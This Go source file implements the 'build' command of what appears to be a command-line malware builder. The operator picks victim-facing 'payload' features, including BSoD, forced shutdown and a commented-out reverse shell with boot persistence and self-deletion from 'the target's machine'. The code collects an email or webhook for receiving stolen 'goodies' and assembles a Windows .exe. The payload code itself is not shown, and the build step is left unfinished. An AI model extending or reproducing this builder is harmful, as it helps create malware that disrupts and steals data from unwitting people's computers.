package commands

import (
	"fmt"
	"os"
	"strings"

	s7cli "mk3cli/s7cli/commands"
	feat "mk3cli/s7cli/features"
)

func init() {
	s7cli.DefaultHandler.AddCommand(s7cli.Command{
		Name:        "build",
		Description: "Build your payload using the selected features.",
		Args:        s7cli.Args{},
		Exec: func(input []string, this s7cli.Command) error {
			var fnames = []string{}
			var email string
			var webhook string

			for _, e := range feat.EnabledFeatures {
				fnames = append(fnames, e.Feature.Name)
			}

			if len(fnames) == 0 {
				fmt.Println("You haven't enabled any features yet (try running 'ls').")
				return nil
			}

			ClearConsole()
			fmt.Println("You are about to build your payload with the following features set:")
		outer:
			for _, f := range feat.FeatureList {
				for _, e := range feat.EnabledFeatures {
					if f.Name == e.Feature.Name {
						fmt.Println("\n   ┌ " + s7cli.Green + f.Name + s7cli.White + feat.DisplayEnabledArgs(f.Args, e.Args) + "\n   └───> " + s7cli.Gray + f.Description + s7cli.Reset)
						continue outer
					}
				}
			}
			res := Input("\nDo you want to continue? [Y/n] > ")
			if !(strings.HasPrefix(strings.ToLower(res), "y") || res == "") {
				println("Aborting...")
				return nil
			}
			changes := ""

			// this is a bunch of extra logic for the case that both
			// bsod and shutdown payloads are enabled
			if Contains(fnames, "shutdown") && Contains(fnames, "bsod") {
				ClearConsole()
				fmt.Println("It looks like you have the Shutdown & BSoD payloads enabled.")
				fmt.Println("Due to their functionality, these 2 features conflict with each other.")

				fmt.Println("\n[1]  ┌ " + s7cli.Green + "bsod" + s7cli.White +
					feat.DisplayEnabledArgs(feat.EnabledFeatures[IndexOf(fnames, "bsod")].Feature.Args, feat.EnabledFeatures[IndexOf(fnames, "bsod")].Args) +
					"\n     └───> " + s7cli.Gray + feat.EnabledFeatures[IndexOf(fnames, "bsod")].Feature.Description + s7cli.Reset)

				fmt.Println("\n[2]  ┌ " + s7cli.Green + "shutdown" + s7cli.White +
					feat.DisplayEnabledArgs(feat.EnabledFeatures[IndexOf(fnames, "shutdown")].Feature.Args, feat.EnabledFeatures[IndexOf(fnames, "shutdown")].Args) +
					"\n     └───> " + s7cli.Gray + feat.EnabledFeatures[IndexOf(fnames, "shutdown")].Feature.Description + s7cli.Reset)

				fmt.Println("\n[3]  Both\n")

				res = Input("Please select which features you would like to disable > ")
				ClearConsole()
				if res == "1" || res == "bsod" {
					feat.EnabledFeatures = feat.RemoveFeature(feat.EnabledFeatures, IndexOf(fnames, "bsod"))
					changes += "> Disabled the bsod payload."
				} else if res == "2" || res == "shutdown" {
					feat.EnabledFeatures = feat.RemoveFeature(feat.EnabledFeatures, IndexOf(fnames, "shutdown"))
					changes += "> Disabled the shutdown payload."
				} else if res == "3" || strings.ToLower(res) == "both" {
					feat.EnabledFeatures = feat.RemoveFeature(feat.EnabledFeatures, IndexOf(fnames, "bsod"))
					feat.EnabledFeatures = feat.RemoveFeature(feat.EnabledFeatures, IndexOf(fnames, "shutdown"))
					changes += "> Disabled the bsod payload.\n"
					changes += "> Disabled the shutdown payload.\n"
				} else {
					fmt.Println(s7cli.Red + "Invalid Response; Aborting..." + s7cli.Reset)
					return nil
				}
				fmt.Println(changes)
			}

			// this is a bunch of extra logic for the lshell payload
			// I commented this because I remove lshell
			/**********************************************************************************/
			/*if Contains(fnames, "lshell") {
			//	ClearConsole()
			//	if EnabledFeatures[IndexOf(fnames, "lshell")].Args[0].Value == false {
			//		if changes != "" {
			//			fmt.Println("Looks like you also have the LShell Reverse Shell payload enabled, but with the startup flag set to false.")
			//		} else {
			//			fmt.Println("Looks like you have the LShell Reverse Shell payload enabled, but with the startup flag set to false.")
			//		}
			//		fmt.Println("Because of this, the shell will be no longer be accessible once the user restarts their machine.")
			//		res = Input("Is this behavior intentional? [Y/n] > ")
			//		if strings.HasPrefix(strings.ToLower(res), "y") || res == "" {
			//			fmt.Println("Liveton includes a built-in self destruct features that automatically removes the executable from the target's machine.")
			//			res = Input("Would you like to enable this features? [y/N] > ")
			//			if strings.HasPrefix(strings.ToLower(res), "y") {
			//				changes += "> Enabled the melt payload.\n"
			//			}
			//		} else if strings.HasPrefix(strings.ToLower(res), "n") {
			//			fmt.Println("What behavior were you attempting to create?")
			//			fmt.Println("\n[1] I wanted the reverse shell to start on every boot")
			//			fmt.Println("\n[2] I didn't want a reverse shell")
			//			res = Input("\nPlease select an option > ")
			//			if res == "1" {
			//				changes += "> Set the lshell startup flag to 'true'.\n"
			//			} else if res == "2" {
			//				changes += "> Disabled the lshell payload.\n"
			//			} else {
			//				fmt.Println(Red + "Invalid Response; Aborting..." + White)
			//			}
			//		} else {
			//			fmt.Println(Red + "Invalid Response; Aborting..." + White)
			//		}
			//	}
			//} */

			ClearConsole()

			// some extra logic to determine if the payload needs to return anything to the user
			payloadReturnsData := false
			for _, f := range feat.EnabledFeatures {
				if f.Feature.ReturnsData {
					payloadReturnsData = true
					break
				}
			}

			if !payloadReturnsData {
				goto build_seq
			}

			fmt.Println(changes)
			fmt.Println("How would you like to receive your goodies?")
			fmt.Println("\n[1] By Email")
			fmt.Println("\n[2] By Webhook")
			fmt.Println("\n[3] I'm not interested in my 'goodies'.")
			res = Input("\nPlease select an option > ")
			switch res {
			// if the user chooses email
			case "1":
				email = Input("Please enter the email address you would like them sent to\n   email > ")
				for !IsValidEmail(email) {
					fmt.Println(s7cli.Red + "Invalid Email Address")
					email = Input("Please enter the email address you would like them sent to\n   email > ")
				}
				break

			// if the user chooses webhook
			case "2":
				webhook = Input("Please paste the webhook url you would like them sent to\n   url > ")
				for !IsValidURL(webhook) || !strings.Contains(webhook, "webhooks") {
					fmt.Println(s7cli.Red + "Invalid Webhook")
					webhook = Input("Please paste the webhook url you would like them sent to\n   url > ")
				}
				break

			// if the user chooses not to recieve their data
			case "3":
				res = Input("Are you sure? > ")
				if strings.HasPrefix(strings.ToLower(res), "y") {
					Write("I mean", 15)
					Write("... ", 100)
					Sleep(500)
					WriteLn("you do you I guess.", 15)
					Sleep(1000)
				}
				break
			default:
				fmt.Println(s7cli.Red + "Invalid Response; Aborting..." + s7cli.Reset)
			}

		build_seq:
			ClearConsole()

			path, temp_dir_error := os.MkdirTemp("", "MK3_BUILDER_*")
			if temp_dir_error != nil {
				fmt.Println(s7cli.Red + "Error creating temp directory, Aborting... " + s7cli.Reset)
			}

			/* TODO:
			- Download payload libraries to "path" directory
			- Add code to generate main.go
			*/

			payload_name := Input("Payload name [leave blank for \"run.exe\"] > ")
			build_command := "go build -o " + payload_name + ".exe " + path + "/main.go "

			for _, f_set := range feat.EnabledFeatures {
				for _, depend := range f_set.Feature.Dependencies {
					build_command += path + "/" + depend
				}
			}

			return nil
		},
	})
}
